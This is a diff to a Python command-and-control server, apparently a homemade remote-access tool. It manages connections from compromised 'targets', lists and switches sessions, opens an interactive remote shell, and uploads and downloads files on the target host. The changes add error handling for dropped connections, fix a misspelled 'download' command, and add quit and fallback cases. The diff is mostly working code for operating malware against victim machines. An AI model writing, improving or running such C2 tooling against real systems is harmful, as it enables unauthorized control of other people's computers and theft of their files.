@@ -13,11 +13,18 @@ connections = list() # List of active connections
 
 def send_command(conn, *args):
     """Send a command to the target"""
-    conn.send(json.dumps(args).encode())
+    try:
+        conn.send(json.dumps(args).encode())
+    except ConnectionResetError as _:
+        print("\033[96m[ERROR] The connection with the target was lost\033[0m")
 
 def wait_response(conn):
     """Gets a response from the target"""
-    raw = conn.recv(1024).decode()
+    try:
+        raw = conn.recv(1024).decode()
+    except ConnectionResetError as _:
+        print("\033[96m[ERROR] The connection with the target was lost\033[0m")
+        return
     data = json.loads(raw)
     return data
 
@@ -34,7 +41,11 @@ def shell(conn):
     cn, addr = lst.accept()
     while True:
         #Receive data from the target and get user input
-        ans = cn.recv(1024).decode(errors='ignore')
+        try:
+            ans = cn.recv(1024).decode(errors='ignore')
+        except ConnectionResetError as _:
+            print("\033[91m[ERROR] The shell was lost. Returning to C2...\033[0m")
+            break
         sys.stdout.write(ans)
         command = input()
         if command == 'exit':
@@ -44,16 +55,31 @@ def shell(conn):
 
         #Send command
         command += "\n"
-        cn.send(command.encode())
+        try:
+            cn.send(command.encode())
+        except ConnectionResetError as _:
+            print("\033[91m[ERROR] The shell was lost. Returning to C2...\033[0m")
+            break
         time.sleep(1)
         sys.stdout.write("\033[A" + ans.split("\n")[-1])
 
 def upload_file(conn, local_path, remote_path):
     print("\033[96m[INFO] Uploading the specified file...\033[0m")
-    f = open(local_path, 'rt')
-    content = f.read()
+    try:
+        f = open(local_path, 'rt')
+        content = f.read()
+    except FileNotFoundError as _:
+        print("\033[91m[ERROR] The specified file does not exist\033[0m")
+        return
+    except OSError as e:
+        print("\033[91m[ERROR] There was an error in the operation\n", e, "\033[0m")
+        return
 
-    send_command(conn, 'upload', content, remote_path)
+    try:
+        send_command(conn, 'upload', content, remote_path)
+    except UnboundLocalError as _:
+        print("\033[91m[ERROR] The specified file does not exist\033[0m")
+        return
 
     upload_status = wait_response(conn)
     if upload_status == '1':
@@ -71,7 +97,7 @@ def download_file(conn, remote_path):
     elif res == '1':
         print("\033[92m[INFO] File successfully downloaded\033[0m")
     else:
-        print("\033[91m[FAIL] These was a problem:\n", res, "\n\033[0m")
+        print("\033[91m[ERROR] These was a problem:\n", res, "\n\033[0m")
 
     
 def listen_for_connections(server):
@@ -95,6 +121,7 @@ if __name__ == '__main__':
             command = input("\033[1mCMD> \033[0m") # Request user command input
             parameters = command.split(' ')
             match parameters[0]: # Parse user command input
+                
                 case 'help': # Print an help message
                     print("""
                         \n<NOME DEL TOOL> 0.1
@@ -108,20 +135,41 @@ if __name__ == '__main__':
                             upload <local_file> <destination_path>: Uploads a specified file (absolute local path)
                             download <remote_file>: Downloads a file from the remote host\n
                         """)
+                    
                 case 'sessions': 
                     i = 0
                     for connection in connections: # Parse all the connections stored to list them
                         print(f"{i} ---- {connection[1]} ----", "\033[92mcurrent\033[0m" if i == session else " ")
                         i += 1
+
                 case 'session':
-                    session = int(parameters[1])
-                    print(f"Selected session {session} on host {connections[session][1]}")
+                    try:
+                        connections[int(parameters[1])][1]
+                    except IndexError as _:
+                        print("\033[91m[ERROR] The selected session does not exist\033[0m")
+                    else:
+                        session = int(parameters[1])
+                        print(f"Selected session {session} on host {connections[session][1]}")
+
                 case 'shell':
                     shell(connections[session][0])
+
                 case 'upload':
                     upload_file(connections[session][0], parameters[1], parameters[2])
-                case 'downaload':
+
+                case 'download':
                     download_file(connections[session][0], parameters[1])
+
+                case 'quit':
+                    res = input("Are you sure you want to quit? [Y/n] ")
+                    if res.lower() == 'y': 
+                        quit()
+                    else:
+                        pass
+
+                case _:
+                    print("\033[93m[INFO] Not a valid command\033[0m")
+
 
 """
 Colors (to be removed...):
